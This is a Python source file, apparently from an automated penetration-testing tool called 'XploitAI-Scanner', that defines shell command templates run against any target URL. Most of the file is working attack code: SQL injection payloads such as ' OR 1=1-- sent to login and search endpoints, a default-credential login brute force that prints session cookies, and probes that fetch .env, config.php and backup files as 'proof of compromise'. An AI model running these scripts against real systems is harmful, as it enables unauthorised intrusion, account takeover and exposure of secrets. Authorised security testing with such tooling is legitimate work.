from __future__ import annotations

import re
from urllib.parse import urlsplit

from core.models import Command


CANONICAL_TEMPLATES: dict[str, str] = {
    "TechnologyFingerprint": (
        "curl -sL -m 20 {target} -o fingerprint_tmp.html && python -c "
        "\"import re,os; body=open('fingerprint_tmp.html').read() if os.path.exists('fingerprint_tmp.html') else ''; "
        "patterns={'WordPress':'wp-content','Joomla':'joomla','Drupal':'Drupal','PHP':'php','jQuery':'jquery','Bootstrap':'bootstrap','React':'react','Angular':'angular','Vue':'vue'}; "
        "[print('TECH_FOUND: '+k) for k,v in patterns.items() if re.search(v,body,re.I)]; "
        "meta=re.findall(r'<meta[^>]+generator[^>]+>',body,re.I); "
        "[print('META_GENERATOR: '+m) for m in meta[:5]]; "
        "os.remove('fingerprint_tmp.html') if os.path.exists('fingerprint_tmp.html') else None\""
    ),
    "EndpointDiscovery": (
        "python -c \"\n"
        "import urllib.request, urllib.error\n"
        "base = '{target}'.rstrip('/')\n"
        "paths = ['admin','login','register','api','api/v1','api/users','dashboard','config','backup','.env','robots.txt','wp-admin','phpmyadmin','health','status','swagger','docs']\n"
        "print('Probing: ' + base)\n"
        "for path in paths:\n"
        "    url = base + '/' + path\n"
        "    try:\n"
        "        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'}, method='HEAD')\n"
        "        resp = urllib.request.urlopen(req, timeout=5)\n"
        "        print('  FOUND [' + str(resp.status) + ']: ' + url)\n"
        "        resp.close()\n"
        "    except urllib.error.HTTPError as e:\n"
        "        if e.code not in (404, 410):\n"
        "            print('  [' + str(e.code) + ']: ' + url)\n"
        "    except Exception:\n"
        "        pass\n"
        "\""
    ),
    "ParameterDiscovery": (
        "python -c \"\n"
        "import urllib.request, urllib.error\n"
        "base = '{target}'.rstrip('/')\n"
        "endpoints = [base+'/login', base+'/api', base+'/search', base+'/api/v1']\n"
        "params = ['id=1','user=admin','debug=1','test=1','page=1','q=test','admin=true']\n"
        "print('Parameter probe: ' + base)\n"
        "for ep in endpoints:\n"
        "    for p in params:\n"
        "        url = ep + '?' + p\n"
        "        try:\n"
        "            req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
        "            resp = urllib.request.urlopen(req, timeout=5)\n"
        "            print('  [' + str(resp.status) + ']: ' + url)\n"
        "            resp.close()\n"
        "        except urllib.error.HTTPError as e:\n"
        "            if e.code not in (404, 410):\n"
        "                print('  [' + str(e.code) + ']: ' + url)\n"
        "        except Exception:\n"
        "            pass\n"
        "\""
    ),
    "VulnerabilityScanning": (
        "python -c \"\n"
        "import urllib.request, urllib.error\n"
        "base = '{target}'.rstrip('/')\n"
        "targets = [('', 'root'), ('/.env', 'env'), ('/config.php', 'config'), ('/backup', 'backup'), ('/server-status', 'server-status'), ('/actuator', 'actuator'), ('/phpinfo.php', 'phpinfo')]\n"
        "security_headers = ['X-Frame-Options','X-Content-Type-Options','Content-Security-Policy','Strict-Transport-Security','X-XSS-Protection']\n"
        "for path, label in targets:\n"
        "    url = base + path\n"
        "    try:\n"
        "        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
        "        resp = urllib.request.urlopen(req, timeout=8)\n"
        "        body = resp.read(300).decode('utf-8', 'ignore')\n"
        "        print('CHECK [' + str(resp.status) + '] ' + label + ' ' + url)\n"
        "        if path == '':\n"
        "            hdrs = dict(resp.headers)\n"
        "            for header in security_headers:\n"
        "                if header in hdrs:\n"
        "                    print('HEADER_PRESENT: ' + header + '=' + hdrs[header])\n"
        "                else:\n"
        "                    print('HEADER_MISSING: ' + header)\n"
        "            if hdrs.get('Server'):\n"
        "                print('SERVER_BANNER: ' + hdrs['Server'])\n"
        "            if hdrs.get('X-Powered-By'):\n"
        "                print('POWERED_BY: ' + hdrs['X-Powered-By'])\n"
        "        if path and resp.status < 400:\n"
        "            print('EXPOSED_PATH: ' + path + ' => ' + body[:120].replace('\\n', ' '))\n"
        "        resp.close()\n"
        "    except urllib.error.HTTPError as e:\n"
        "        print('CHECK [' + str(e.code) + '] ' + label + ' ' + url)\n"
        "        if path and e.code not in (403, 404, 410):\n"
        "            print('SUSPICIOUS_PATH: ' + path + ' status=' + str(e.code))\n"
        "    except Exception as e:\n"
        "        print('SCAN_ERROR: ' + url + ' => ' + str(e))\n"
        "\""
    ),
    "SQLInjectionProbe": (
        "python -c \"\n"
        "import urllib.request, urllib.error, urllib.parse\n"
        "base = '{target}'.rstrip('/')\n"
        "payloads = [\\\"' OR '1'='1\\\", \\\"' OR 1=1--\\\", \\\"admin'--\\\", \\\"' UNION SELECT NULL--\\\"]\n"
        "targets = [('/login', 'POST', {'username': 'PAYLOAD', 'password': 'test'}), ('/search', 'GET', {'q': 'PAYLOAD'}), ('/api/users', 'GET', {'id': 'PAYLOAD'})]\n"
        "signals = ['sql', 'syntax', 'mysql', 'sqlite', 'postgres', 'odbc', 'exception', 'warning']\n"
        "for path, method, template in targets:\n"
        "    for payload in payloads:\n"
        "        params = {k: (payload if v == 'PAYLOAD' else v) for k, v in template.items()}\n"
        "        try:\n"
        "            if method == 'POST':\n"
        "                data = urllib.parse.urlencode(params).encode()\n"
        "                req = urllib.request.Request(base + path, data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n"
        "            else:\n"
        "                req = urllib.request.Request(base + path + '?' + urllib.parse.urlencode(params), headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
        "            resp = urllib.request.urlopen(req, timeout=8)\n"
        "            body = resp.read(500).decode('utf-8', 'ignore')\n"
        "            print('SQLI_CHECK [' + str(resp.status) + '] ' + path + ' payload=' + payload)\n"
        "            if any(s in body.lower() for s in signals):\n"
        "                print('SQLI_SIGNAL: ' + path + ' payload=' + payload + ' evidence=' + body[:160].replace('\\n', ' '))\n"
        "            resp.close()\n"
        "        except urllib.error.HTTPError as e:\n"
        "            body = e.read(400).decode('utf-8', 'ignore') if hasattr(e, 'read') else ''\n"
        "            print('SQLI_CHECK [' + str(e.code) + '] ' + path + ' payload=' + payload)\n"
        "            if any(s in body.lower() for s in signals):\n"
        "                print('SQLI_SIGNAL: ' + path + ' payload=' + payload + ' evidence=' + body[:160].replace('\\n', ' '))\n"
        "        except Exception as e:\n"
        "            print('SQLI_ERROR: ' + path + ' payload=' + payload + ' => ' + str(e))\n"
        "\""
    ),
    "ExploitAttempt": (
        "python -c \"\n"
        "import urllib.request, urllib.error, urllib.parse\n"
        "base = '{target}'.rstrip('/')\n"
        "login_paths = ['/login', '/signin', '/admin/login']\n"
        "creds = [('admin','admin'),('admin','password'),('admin','123456'),('administrator','admin'),('test','test')]\n"
        "for login_path in login_paths:\n"
        "    for user, pwd in creds:\n"
        "        data = urllib.parse.urlencode({'username': user, 'password': pwd}).encode()\n"
        "        try:\n"
        "            req = urllib.request.Request(base + login_path, data=data, headers={'User-Agent': 'XploitAI-Scanner/1.0', 'Content-Type': 'application/x-www-form-urlencoded'})\n"
        "            resp = urllib.request.urlopen(req, timeout=8)\n"
        "            body = resp.read(400).decode('utf-8', 'ignore')\n"
        "            location = resp.headers.get('Location', '')\n"
        "            cookies = resp.headers.get_all('Set-Cookie', []) if hasattr(resp.headers, 'get_all') else []\n"
        "            print('AUTH_CHECK [' + str(resp.status) + '] ' + login_path + ' user=' + user)\n"
        "            if location:\n"
        "                print('REDIRECT_TARGET: ' + location)\n"
        "            if cookies:\n"
        "                print('SESSION_COOKIE: ' + '; '.join(cookies[:2]))\n"
        "            if any(x in body.lower() for x in ['logout','dashboard','welcome','profile','admin panel']) or '/dashboard' in location or '/admin' in location or cookies:\n"
        "                print('AUTH_SUCCESS: ' + login_path + ' user=' + user + ' password=' + pwd)\n"
        "                raise SystemExit(0)\n"
        "            resp.close()\n"
        "        except urllib.error.HTTPError as e:\n"
        "            body = e.read(300).decode('utf-8', 'ignore') if hasattr(e, 'read') else ''\n"
        "            print('AUTH_CHECK [' + str(e.code) + '] ' + login_path + ' user=' + user)\n"
        "            if any(x in body.lower() for x in ['logout','dashboard','welcome','profile','admin panel']):\n"
        "                print('AUTH_SUCCESS: ' + login_path + ' user=' + user + ' password=' + pwd)\n"
        "                raise SystemExit(0)\n"
        "        except Exception as e:\n"
        "            print('AUTH_ERROR: ' + login_path + ' user=' + user + ' => ' + str(e))\n"
        "print('AUTH_SUCCESS: none')\n"
        "\""
    ),
    "ProofOfCompromise": (
        "python -c \"\n"
        "import urllib.request, urllib.error\n"
        "base = '{target}'.rstrip('/')\n"
        "targets = [('/.env','env file'),('/config.php','config'),('/api/users','user list'),('/api/admin','admin api'),('/backup','backup'),('/dashboard','dashboard'),('/admin','admin panel'),('/phpinfo.php','phpinfo'),('/server-status','server status')]\n"
        "proof_count = 0\n"
        "for path, label in targets:\n"
        "    url = base + path\n"
        "    try:\n"
        "        req = urllib.request.Request(url, headers={'User-Agent': 'XploitAI-Scanner/1.0'})\n"
        "        resp = urllib.request.urlopen(req, timeout=8)\n"
        "        body = resp.read(220).decode('utf-8', 'ignore').replace('\\n', ' ')\n"
        "        print('POC_CHECK [' + str(resp.status) + '] ' + path + ' (' + label + ')')\n"
        "        if resp.status < 400:\n"
        "            proof_count += 1\n"
        "            print('PROOF_FOUND: ' + path + ' => ' + body[:160])\n"
        "        resp.close()\n"
        "    except urllib.error.HTTPError as e:\n"
        "        print('POC_CHECK [' + str(e.code) + '] ' + path + ' (' + label + ')')\n"
        "    except Exception as e:\n"
        "        print('POC_ERROR: ' + path + ' => ' + str(e))\n"
        "print('PROOF_SUMMARY: ' + str(proof_count) + ' accessible proof targets')\n"
        "\""
    ),
}

PLACEHOLDERS = {
    "target",
    "target_url",
    "target_host",
    "target_domain",
}

_KNOWN_PLACEHOLDER_RE = re.compile(
    r"\{(" + "|".join(sorted(PLACEHOLDERS)) + r")\}"
)

_TOOL_PATTERNS: tuple[tuple[str, str], ...] = (
    ("python", r"(?<![\w./-])python(?:3)?(?![\w./-])"),
    ("curl", r"(?<![\w./-])curl(?![\w./-])"),
    ("jq", r"(?<![\w./-])jq(?![\w./-])"),
    ("grep", r"(?<![\w./-])grep(?![\w./-])"),
    ("nmap", r"(?<![\w./-])nmap(?![\w./-])"),
    ("whatweb", r"(?<![\w./-])whatweb(?![\w./-])"),
    ("dirsearch", r"(?<![\w./-])dirsearch(?:\.py)?(?![\w./-])"),
    ("arjun", r"(?<![\w./-])arjun(?![\w./-])"),
    ("nikto", r"(?<![\w./-])nikto(?![\w./-])"),
    ("sqlmap", r"(?<![\w./-])sqlmap(?![\w./-])"),
    ("hydra", r"(?<![\w./-])hydra(?![\w./-])"),
    ("paramspider", r"(?<![\w./-])paramspider(?:\.py)?(?![\w./-])"),
)


def escape_non_placeholder_braces(template: str) -> str:
    """
    Escape braces that belong to inline Python/JSON snippets so str.format()
    only processes known command placeholders.
    """
    if not template or "{" not in template:
        return template

    def replace(match: re.Match[str]) -> str:
        token = match.group(1).strip()
        if token in PLACEHOLDERS:
            return "{" + token + "}"
        return "{{" + match.group(1) + "}}"

    return re.sub(r"\{([^{}]+)\}", replace, template)


def normalize_command_template(command_obj: Command) -> str:
    """
    Normalize command templates for safe rendering while preserving DB intent.
    Only falls back to canonical template when DB template is empty.

    Important: escaped templates must not be persisted back to the database.
    Persisting the brace-escaped form causes repeated re-escaping across runs,
    which eventually produces commands containing '{{{{...}}}}'.
    """
    canonical = CANONICAL_TEMPLATES.get(command_obj.name)
    if canonical:
        return canonical

    template = command_obj.command_template or ""

    return escape_non_placeholder_braces(template)


def render_command_template(template: str, context: dict[str, str]) -> str:
    """
    Render command templates safely by replacing only known placeholders.

    This avoids Python str.format interpreting literal braces in inline
    Python/JSON snippets (e.g., {'User-Agent': '...'}, {'WordPress': ...}).
    """
    if not template:
        return template

    def replace(match: re.Match[str]) -> str:
        key = match.group(1)
        if key not in context:
            raise KeyError(key)
        return str(context[key])

    rendered = _KNOWN_PLACEHOLDER_RE.sub(replace, template)
    # Backward compatibility for templates previously escaped for str.format().
    return rendered.replace("{{", "{").replace("}}", "}")


def build_target_context(target: str) -> dict[str, str]:
    """
    Derive URL/host/domain placeholders from the persisted target value.

    Web targets are often stored as full URLs, but host-oriented tools such as
    nmap require only the hostname/IP component.
    """
    raw_target = str(target or "").strip()
    if not raw_target:
        return {
            "target": "",
            "target_url": "",
            "target_host": "",
            "target_domain": "",
        }

    parsed = urlsplit(raw_target if "://" in raw_target else f"//{raw_target}")
    host = parsed.hostname or raw_target

    return {
        "target": raw_target,
        "target_url": raw_target,
        "target_host": host,
        "target_domain": host,
    }


def infer_required_tools(command: str) -> list[str]:
    """Infer likely executor tool dependencies from a shell command string."""
    tools: list[str] = []
    text = str(command or "")
    for tool_name, pattern in _TOOL_PATTERNS:
        if re.search(pattern, text):
            tools.append(tool_name)
    return tools
